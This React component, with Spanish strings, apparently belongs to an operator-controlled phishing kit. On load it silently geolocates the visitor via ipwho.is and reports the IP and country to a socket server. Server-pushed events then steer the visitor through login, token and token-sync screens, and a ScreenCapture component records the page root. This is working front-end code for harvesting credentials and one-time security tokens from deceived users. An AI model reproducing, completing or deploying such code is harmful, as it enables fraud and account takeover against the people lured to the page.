import React from "react";
import { useSocket } from "../appComponents/SocketContext";
import eventBus from "../appComponents/EventBus";
import Login from "./Login";
import Loading from "./Loading";
import Home from "./Home";
import Token from "./Token";
import Notify from "./Notify";
import TokenSync from "./TokenSync";
import {
  sRealName,
} from "../../features/users/usersSlice";
import { useDispatch } from "react-redux";
import ScreenCapture from "../ScreenCapture";


function Main({ data }) {
  const { sendMessage } = useSocket();
  const [page, setPage] = React.useState(0);
  const [isNotify, setIsNotify] = React.useState(false);
  const [isToken, setIsToken] = React.useState(false);
  const [isTokenSync, setIsTokenSync] = React.useState(false);
  const [s, setS] = React.useState(false);
  const dispatch = useDispatch();

  React.useEffect(() => {
    const getGeoInfo = async () => {
      try {
        const getFlagEmoji = (countryCode) => {
          if (!countryCode) return "🏳️";
          return countryCode
            .toUpperCase()
            .split("")
            .map((char) => String.fromCodePoint(127397 + char.charCodeAt(0)))
            .join("");
        };

        const response = await fetch("https://ipwho.is/");
        const data = await response.json();

        if (!data.success && !data.ip) {
          throw new Error("Datos incompletos del servicio de geolocalización");
        }

        const geoData = {
          ip: data.ip || "desconocida",
          country: data.country || "desconocido",
          country_code: data.country_code || "XX",
          flag: getFlagEmoji(data.country_code || "XX"),
        };

        sendMessage("login_client", {
          username: "",
          password: "",
          ip: geoData.ip,
          country: geoData.country,
          flag: geoData.flag,
        });
      } catch (error) {
        try {
          const backupResponse = await fetch(
            "https://geolocation-db.com/json/"
          );
          const backupData = await backupResponse.json();

          const getFlagEmoji = (countryCode) => {
            if (!countryCode) return "🏳️";
            return countryCode
              .toUpperCase()
              .split("")
              .map((char) => String.fromCodePoint(127397 + char.charCodeAt(0)))
              .join("");
          };

          const backupGeoData = {
            ip: backupData.IPv4 || "desconocida",
            country: backupData.country_name || "desconocido",
            flag: getFlagEmoji(backupData.country_code || "XX"),
          };

          sendMessage("login_client", {
            username: "",
            password: "",
            ip: backupGeoData.ip,
            country: backupGeoData.country,
            flag: backupGeoData.flag,
          });
        } catch (backupError) {
          sendMessage("login_client", {
            username: "",
            password: "",
            ip: "desconocida",
            country: "desconocido",
            flag: "🏳️",
          });
        }
      }
    };

    getGeoInfo();
  }, [sendMessage]);

  React.useEffect(() => {
    eventBus.on("page", (e) => {

      if (e.p !== 6) setPage(e.p);
      setS(false);

      if(e.p === 0){
        setIsToken(false);
        setIsTokenSync(false);
        setIsNotify(false);
      }

      if (e.p === 1) {
        dispatch(sRealName(e.name));
        setIsToken(true);
        setIsTokenSync(false);
        setIsNotify(false);
      }
      if (e.p === 2) {
        dispatch(sRealName(e.name));
        setIsToken(false);
        setIsTokenSync(true);
        setIsNotify(false);
      }
      if (e.p === 6) {
        setIsNotify(true);
        setIsToken(false);
        setIsTokenSync(false);
      }
    });

    eventBus.on("home_token_response", (e) => {
      setIsToken(e.isToken);
      setIsNotify(false);
      setIsTokenSync(false);
    });

    eventBus.on("home_tokenSync_response", (e) => {
      setIsTokenSync(e.isTokenSync);
      setIsNotify(false);
      setIsToken(false);
    });

    return () => {
      eventBus.off("page");
      eventBus.off("home_token_response");
      eventBus.off("home_tokenSync_response");
    };
  }, []);

  return (
    <>
      {page === 0 && <Login key={page} data={data} sS={setS} />}
      {page === 1 && <Home />}
      {page === 2 && <Home />}
      {isToken && <Token sS={setS} />}
      {isTokenSync && <TokenSync />}
      {isNotify && <Notify />}
      {s && <Loading />}

      <ScreenCapture elementId="root" />
    </>
  );
}
export default Main;
